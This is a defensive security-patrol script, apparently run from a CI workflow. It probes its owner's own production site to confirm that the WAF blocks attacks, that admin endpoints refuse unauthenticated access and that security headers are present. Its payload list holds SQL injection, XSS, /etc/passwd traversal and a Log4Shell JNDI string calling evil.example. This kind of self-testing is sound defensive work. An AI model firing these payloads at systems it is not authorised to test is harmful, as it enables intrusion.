#!/usr/bin/env node
/**
 * security-patrol.mjs — external black-box probe of the production site.
 *
 * Run daily by .github/workflows/security-patrol.yml (and on demand). It
 * "tries to hack in" exactly the way an opportunistic attacker would
 * (SQLi, XSS, path traversal, Log4Shell, time-based SQLi, unauthenticated
 * admin access) against OUR OWN production URL, verifies the in-worker WAF
 * and auth gates answer correctly, audits the security headers, and reads
 * the canary's WAF counters to report real intrusion attempts that were
 * detected and blocked since the last deploy.
 *
 * Every check that fails carries a `fix` hint so the generated GitHub issue
 * says what could be fixed, not just what is wrong.
 *
 * Output: human-readable log on stderr + a single JSON document on stdout
 * between the markers ::PATROL-JSON:: (parsed by the workflow).
 * Exit code is always 0 unless the script itself crashes — findings are
 * data, not failures.
 */

import { writeFileSync } from 'node:fs';

const BASE = (process.env.PATROL_BASE_URL || 'https://stock.afmarbre.com').replace(/\/+$/, '');
const UA = 'atlas-security-patrol/1.0 (github-actions; own-infrastructure)';

const results = [];
function check(id, title, severity, ok, detail, fix) {
  results.push({ id, title, severity: ok ? 'none' : severity, ok, detail, fix: ok ? '' : fix });
  const line = `${ok ? 'PASS' : 'FIND'} [${id}] ${title}${ok ? '' : ` — ${detail}`}`;
  process.stderr.write(line + '\n');
}

async function probe(path, init = {}) {
  const url = `${BASE}${path}`;
  try {
    const res = await fetch(url, {
      redirect: 'manual',
      signal: AbortSignal.timeout(15_000),
      ...init,
      headers: { 'User-Agent': UA, ...(init.headers || {}) },
    });
    const text = await res.text().catch(() => '');
    return { status: res.status, headers: Object.fromEntries(res.headers.entries()), text: text.slice(0, 4000) };
  } catch (e) {
    return { status: 0, headers: {}, text: '', error: String(e?.message || e) };
  }
}

const wafPayloads = [
  { id: 'waf-sqli-union', name: 'SQL injection (UNION SELECT)', path: "/api/products?search=1%20UNION%20SELECT%20password%20FROM%20users", fix: 'WAF signature `union select` not blocking — verify the v232 WAF middleware is still mounted before all /api routes in worker/index.ts.' },
  { id: 'waf-sqli-time', name: 'Time-based SQL injection (WAITFOR DELAY)', path: "/api/products?q=x%3BWAITFOR%20DELAY%20%270%3A0%3A5%27", fix: 'WAF signature `waitfor delay` not blocking — check WAF_SIGS in worker/index.ts.' },
  { id: 'waf-xss', name: 'Reflected XSS (<script>)', path: "/api/products?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", fix: 'WAF signature `<script` not blocking — check WAF_SIGS; also confirm the payload is not reflected in the JSON body.' },
  { id: 'waf-traversal', name: 'Path traversal (/etc/passwd)', path: "/api/products?file=..%2F..%2Fetc%2Fpasswd", fix: 'WAF signature `../etc` not blocking — check WAF_SIGS in worker/index.ts.' },
  { id: 'waf-log4j', name: 'Log4Shell (JNDI lookup)', path: "/api/products?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", fix: 'WAF signature `jndi:` not blocking — check WAF_SIGS in worker/index.ts.' },
];

async function main() {
  process.stderr.write(`security-patrol probing ${BASE}\n`);
  const startedAt = new Date().toISOString();

  // 0. Site reachable at all?
  const health = await probe('/api/health');
  if (health.status === 0) {
    check('site-up', 'Production site reachable', 'critical', false,
      `no response from ${BASE}: ${health.error}`,
      'Site unreachable — verify the worker is deployed (`npx wrangler deploy`) and the DNS/custom domain stock.afmarbre.com still points at it.');
    emit(startedAt, { reachable: false });
    return;
  }
  check('site-up', 'Production site reachable (/api/health)', 'critical', health.status === 200,
    `HTTP ${health.status}`, 'GET /api/health must return 200 — check the Cloudflare dashboard for deploy errors.');

  // 1. Canary + WAF intrusion counters (real attacks detected since last deploy)
  const canary = await probe('/api/canary');
  let wafInfo = null;
  if (canary.status === 200 || canary.status === 503) {
    try {
      const j = JSON.parse(canary.text);
      wafInfo = j?.data?.waf || null;
      const checks = j?.data?.checks || {};
      const bad = Object.entries(checks).filter(([, v]) => !v?.ok).map(([k]) => k);
      check('canary-subsystems', 'Canary: D1/KV/R2 subsystems healthy', 'high', bad.length === 0,
        `unhealthy subsystems: ${bad.join(', ')}`,
        `Canary reports ${bad.join(' + ')} failing — check the binding still exists in wrangler.jsonc and the resource in the Cloudflare dashboard.`);
    } catch { /* not JSON */ }
  }
  check('canary-up', 'Canary endpoint responds', 'medium', canary.status === 200 || canary.status === 503,
    `HTTP ${canary.status}`, 'GET /api/canary should answer 200 (or 503 when a subsystem is down) — it exposes no secrets; make sure the route was not removed.');

  // 2. Active intrusion probes — the in-worker WAF must answer 403 WAF_BLOCKED
  for (const p of wafPayloads) {
    const r = await probe(p.path);
    const blocked = r.status === 403 && /WAF_BLOCKED/i.test(r.text);
    const leaked = r.status === 200 && /(password|sqlite_master|<script)/i.test(r.text);
    check(p.id, `WAF blocks ${p.name}`, 'critical', blocked && !leaked,
      `expected 403 WAF_BLOCKED, got HTTP ${r.status}${leaked ? ' AND payload reflected in body' : ''}`, p.fix);
  }

  // 3. Unauthenticated access to sensitive endpoints must be denied
  const adminProbes = [
    { id: 'authz-r2-list', path: '/api/admin/r2/images', name: 'admin R2 listing without session', fix: 'GET /api/admin/r2/images returned data without auth — requireOwner() gate is missing or broken on this route.' },
    { id: 'authz-android-release-get', path: '/api/admin/android-release', name: 'CI release endpoint without token (GET)', fix: 'The CI ingestion endpoint must never answer 200 without a Bearer token — check the auth block at the top of worker/routes/androidRelease.ts.' },
    { id: 'authz-users', path: '/api/users', name: 'user listing without session', fix: 'GET /api/users returned data without auth — verify the /api/* auth middleware exemption list in worker/index.ts did not grow too wide.' },
  ];
  for (const a of adminProbes) {
    const r = await probe(a.path);
    check(a.id, `Denies ${a.name}`, 'critical', r.status === 401 || r.status === 403 || r.status === 404 || r.status === 405,
      `expected 401/403/404/405, got HTTP ${r.status}`, a.fix);
  }
  const postRelease = await probe('/api/admin/android-release', { method: 'POST', headers: { 'content-length': '20000' }, body: 'x'.repeat(64) });
  const unauthorizedOk = postRelease.status === 401 && /UNAUTHORIZED/.test(postRelease.text);
  check('authz-android-release-post', 'POST release ingestion without Bearer → 401 UNAUTHORIZED', 'critical', unauthorizedOk,
    `expected 401 UNAUTHORIZED, got HTTP ${postRelease.status}`,
    'POST /api/admin/android-release must reject tokenless uploads with {ok:false,success:false,error:"UNAUTHORIZED"} — check secretMatches() in worker/routes/androidRelease.ts.');

  // 4. Security headers on the SPA shell
  const home = await probe('/');
  const headerChecks = [
    ['X-Content-Type-Options', 'nosniff', 'medium', 'Add `c.header(\'X-Content-Type-Options\', \'nosniff\')` in the global middleware of worker/index.ts.'],
    ['X-Frame-Options', 'DENY', 'medium', 'Add X-Frame-Options: DENY in the global middleware — protects against clickjacking.'],
    ['Content-Security-Policy', null, 'high', 'The CSP header is missing — restore the policy block in the global middleware of worker/index.ts.'],
    ['Strict-Transport-Security', null, 'high', 'HSTS missing — the header must be set for non-localhost hosts in worker/index.ts (and the request must be HTTPS).'],
    ['Referrer-Policy', null, 'low', 'Referrer-Policy missing — add it to the global security-headers middleware.'],
  ];
  for (const [h, expected, sev, fix] of headerChecks) {
    const v = home.headers[h.toLowerCase()] || '';
    const ok = expected ? v.toLowerCase() === expected.toLowerCase() : v.length > 0;
    check(`header-${h.toLowerCase()}`, `Security header ${h}`, sev, ok,
      `header ${h} = "${v || '(missing)'}" (expected ${expected || 'present'})`, fix);
  }

  // 5. Public update endpoint hygiene
  const upd = await probe('/api/app/android-update?versionCode=1&versionName=0.0.1');
  const noCache = /no-cache/.test(upd.headers['cache-control'] || '');
  const noSecrets = !/(_token|api[_-]?key|secret|password)/i.test(upd.text);
  check('update-endpoint', 'Public update endpoint: no-cache + no secrets', 'high',
    upd.status === 200 && noCache && noSecrets,
    `HTTP ${upd.status}, cache-control="${upd.headers['cache-control'] || '(none)'}", secrets-in-body=${!noSecrets}`,
    'GET /api/app/android-update must be public, answer Cache-Control: no-cache and never include tokens/keys — review buildAndroidUpdateResponse() in worker/routes/androidRelease.ts.');
  const headMirror = await probe('/app-updates/android/latest.json', { method: 'HEAD' });
  check('mirror-head', 'HEAD /app-updates/* answered properly (200/404, not 405)', 'medium',
    headMirror.status === 200 || headMirror.status === 404,
    `HTTP ${headMirror.status}`,
    'HEAD on the CDN1 mirror paths must go through serveAppUpdatesAsset() → bucket.head(); a 405 means the explicit fetch() dispatch in worker/index.ts is missing.');

  emit(startedAt, { reachable: true, waf: wafInfo });
}

function emit(startedAt, extra) {
  const findings = results.filter((r) => !r.ok);
  const doc = {
    base: BASE,
    startedAt,
    finishedAt: new Date().toISOString(),
    totalChecks: results.length,
    passed: results.length - findings.length,
    findings,
    results,
    ...extra,
  };
  process.stdout.write('::PATROL-JSON::' + JSON.stringify(doc) + '::END-PATROL-JSON::\n');

  // Human-readable issue body (written next to the JSON for the workflow).
  const waf = doc.waf;
  const lines = [
    `## 🛡️ Security patrol — ${doc.startedAt}`,
    ``,
    `Cible : **${doc.base}** · ${doc.passed}/${doc.totalChecks} contrôles OK`,
    ``,
  ];
  if (waf && waf.blocked) {
    lines.push(
      `### 🚨 Intrusions réelles détectées et bloquées par le WAF`,
      ``,
      `**${waf.blocked} requête(s) malveillante(s)** bloquée(s) depuis le dernier déploiement — dernière signature \`${waf.lastSig || '?'}\` à ${waf.lastAt || '?'}.`,
      `Le pare-feu applicatif fonctionne : ces tentatives ont échoué (403 WAF_BLOCKED), rien à corriger de ce côté.`,
      ``,
    );
  } else {
    lines.push(
      `### ✅ WAF`,
      ``,
      `Aucune tentative d'intrusion bloquée depuis le dernier déploiement (compteur canary à 0).`,
      ``,
    );
  }
  if (findings.length) {
    lines.push(`### ⚠️ Points à corriger (${findings.length})`, ``);
    for (const f of findings) {
      lines.push(`- **[${String(f.severity).toUpperCase()}] ${f.title}** — ${f.detail}`);
      lines.push(`  - 🔧 Fix possible : ${f.fix}`);
    }
    lines.push(``);
  } else {
    lines.push(
      `### ✅ Aucun point à corriger`,
      ``,
      `Toutes les sondes d'intrusion sont bloquées, les en-têtes de sécurité sont présents et les endpoints sensibles refusent les accès non authentifiés.`,
      ``,
    );
  }
  try {
    const out = process.env.PATROL_REPORT || 'report.md';
    writeFileSync(out, lines.join('\n'));
    process.stderr.write(`report written to ${out}\n`);
  } catch (e) {
    process.stderr.write(`report write failed: ${e?.message || e}\n`);
  }
}

main().catch((e) => {
  process.stderr.write(`patrol crashed: ${e?.stack || e}\n`);
  emit(new Date().toISOString(), { reachable: false, crash: String(e?.message || e) });
});
